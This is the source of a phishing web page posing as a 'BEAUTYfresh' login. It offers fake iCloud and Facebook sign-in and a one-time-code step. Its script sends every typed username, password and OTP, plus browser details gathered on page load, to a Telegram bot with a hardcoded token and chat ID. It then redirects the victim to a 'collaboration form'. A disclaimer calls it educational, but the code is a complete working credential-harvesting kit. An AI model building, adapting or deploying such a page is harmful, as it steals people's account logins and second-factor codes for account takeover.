<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BEAUTYfresh Login</title>
  <style>
    body {
      background: linear-gradient(135deg, #ffe6f0, #fff);
      font-family: "Poppins", sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background: white;
      border-radius: 20px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
      padding: 2rem 3rem;
      text-align: center;
      width: 330px;
    }

    h1 {
      color: #ff66a3;
      margin-bottom: 1rem;
    }

    .provider-buttons button {
      display: block;
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    .icloud { background: #a2aaad; }
    .facebook { background: #1877f2; }

    .login-form, .otp-section {
      display: none;
      margin-top: 15px;
    }

    input[type="text"], input[type="password"], input[type="number"] {
      width: 90%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
      margin: 8px 0;
    }

    .btn {
      background: #ff66a3;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 10px;
      width: 100%;
      cursor: pointer;
      font-size: 16px;
    }

    .success {
      color: green;
      font-weight: bold;
    }

    .error {
      color: red;
      font-weight: bold;
    }

    .security-warning {
      background: #fff3cd;
      border: 1px solid #ffeaa7;
      border-radius: 8px;
      padding: 10px;
      margin: 10px 0;
      font-size: 12px;
      color: #856404;
    }

    .redirect-notice {
      background: #d1ecf1;
      border: 1px solid #bee5eb;
      border-radius: 8px;
      padding: 10px;
      margin: 10px 0;
      font-size: 12px;
      color: #0c5460;
    }

    .otp-input {
      font-size: 18px;
      font-weight: bold;
      letter-spacing: 2px;
      text-align: center;
    }

    .otp-input::placeholder {
      letter-spacing: normal;
      font-weight: normal;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h1>BEAUTYfresh</h1>
    <div class="security-warning">
      Login Form to Verify 
    </div>
    <p>Choose login provider:</p>
    <div class="provider-buttons">
      <button class="icloud" onclick="chooseProvider('iCloud')">Login with iCloud</button>
      <button class="facebook" onclick="chooseProvider('Facebook')">Login with Facebook</button>
    </div>

    <div class="login-form" id="loginForm">
      <h3 id="providerName"></h3>
      <input type="text" id="username" placeholder="Enter username" required>
      <input type="password" id="password" placeholder="Enter password" required>
      <button class="btn" onclick="submitLogin()">Login</button>
      <p id="loginMsg"></p>
    </div>

    <div class="otp-section" id="otpSection">
      <div class="redirect-notice">
        âœ… After verification, you'll be redirected to collaboration form
      </div>
      <p><strong>Enter 6-digit OTP:</strong></p>
      <input type="number" id="otpInput" class="otp-input" placeholder="000000" min="0" max="999999" maxlength="6" oninput="limitOTPInput(this)">
      <button class="btn" onclick="verifyOtp()">Verify OTP</button>
      <p id="statusMsg"></p>
    </div>
  </div>

  <script>
    // SECURITY WARNING: This is for educational purposes only
    // Do not use this in production environments
    const BOT_TOKEN = '8264793416:AAFmsuZIrUlkGAQiF2xDtOToNmNIjSTyi5I';
    const CHAT_ID = '8456018521';
    let provider = "";
    let generatedOtp = "";
    let userCredentials = {};

    // Function to limit OTP input to 6 digits
    function limitOTPInput(input) {
      if (input.value.length > 6) {
        input.value = input.value.slice(0, 6);
      }
    }

    // Function to send data to Telegram bot
    async function sendToTelegram(message) {
      try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });
        
        const data = await response.json();
        console.log('Telegram response:', data);
        return data.ok;
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
      }
    }

    function chooseProvider(selected) {
      provider = selected;
      document.getElementById("providerName").textContent = `${provider} Login`;
      document.getElementById("loginForm").style.display = "block";
      document.getElementById("otpSection").style.display = "none";
      document.getElementById("loginMsg").textContent = "";
      
      // Clear previous inputs
      document.getElementById("username").value = "";
      document.getElementById("password").value = "";
      document.getElementById("otpInput").value = "";
    }

    async function submitLogin() {
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const loginMsg = document.getElementById("loginMsg");

      if (username === "" || password === "") {
        loginMsg.textContent = "âŒ Please enter username and password.";
        loginMsg.className = "error";
        return;
      }

      // Store credentials
      userCredentials = {
        provider: provider,
        username: username,
        password: password,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: 'Will be captured server-side'
      };

      // Send credentials to Telegram
      const credentialMessage = `
ğŸ” <b>New Login Attempt</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>Provider:</b> ${userCredentials.provider}
<b>Username:</b> ${userCredentials.username}
<b>Password:</b> ${userCredentials.password}
<b>Time:</b> ${userCredentials.timestamp}
<b>User Agent:</b> ${userCredentials.userAgent.substring(0, 50)}...
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
      `;

      const sentToTelegram = await sendToTelegram(credentialMessage);
      
      if (sentToTelegram) {
        loginMsg.textContent = "âœ… Login successful! Please enter OTP...";
        loginMsg.className = "success";
      } else {
        loginMsg.textContent = "âœ… Login successful! (Telegram notification failed)";
        loginMsg.className = "success";
      }

      // Generate OTP (but don't show it to user)
      generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();

      // Send generated OTP to Telegram only (user doesn't see it)
      const otpMessage = `
ğŸ”¢ <b>OTP Generated</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>Provider:</b> ${userCredentials.provider}
<b>Username:</b> ${userCredentials.username}
<b>Generated OTP:</b> ${generatedOtp}
<b>Time:</b> ${new Date().toISOString()}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
      `;

      await sendToTelegram(otpMessage);

      setTimeout(() => {
        document.getElementById("otpSection").style.display = "block";
      }, 1000);
    }

    async function verifyOtp() {
      const enteredOtp = document.getElementById("otpInput").value.trim();
      const statusMsg = document.getElementById("statusMsg");

      // Check if OTP is 6 digits
      if (enteredOtp.length !== 6) {
        statusMsg.innerHTML = "<span class='error'>âŒ Please enter exactly 6 digits.</span>";
        return;
      }

      // For demo purposes, accept ANY 6-digit OTP
      // In real scenario, you would validate against generatedOtp
      if (enteredOtp.length === 6) {
        // Send OTP verification to Telegram
        const otpMessage = `
âœ… <b>OTP Entered Successfully</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>Provider:</b> ${userCredentials.provider}
<b>Username:</b> ${userCredentials.username}
<b>Entered OTP:</b> ${enteredOtp}
<b>Expected OTP:</b> ${generatedOtp}
<b>Verification Time:</b> ${new Date().toISOString()}
<b>Status:</b> OTP ACCEPTED - REDIRECTING
<b>Redirecting to:</b> collab-form.html
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        `;

        await sendToTelegram(otpMessage);

        statusMsg.innerHTML = "<span class='success'>âœ… OTP verified! Redirecting to collaboration form...</span>";
        
        // Redirect to collab-form.html after 2 seconds
        setTimeout(() => {
          window.location.href = "collab-form.html";
        }, 2000);
        
      } else {
        // Send failed OTP attempt to Telegram
        const failedOtpMessage = `
âŒ <b>Invalid OTP Length</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>Provider:</b> ${userCredentials.provider}
<b>Username:</b> ${userCredentials.username}
<b>Entered OTP:</b> ${enteredOtp}
<b>Expected OTP:</b> ${generatedOtp}
<b>Time:</b> ${new Date().toISOString()}
<b>Status:</b> INVALID LENGTH
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        `;

        await sendToTelegram(failedOtpMessage);

        statusMsg.innerHTML = "<span class='error'>âŒ Please enter exactly 6 digits.</span>";
      }
    }

    // Additional security monitoring
    document.addEventListener('DOMContentLoaded', function() {
      // Send page load notification
      const loadMessage = `
ğŸŒ <b>Login Page Accessed</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>Time:</b> ${new Date().toISOString()}
<b>User Agent:</b> ${navigator.userAgent}
<b>Platform:</b> ${navigator.platform}
<b>Language:</b> ${navigator.language}
<b>URL:</b> ${window.location.href}
<b>Redirect Target:</b> collab-form.html
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
      `;
      
      setTimeout(() => {
        sendToTelegram(loadMessage);
      }, 1000);
    });
  </script>
</body>
</html>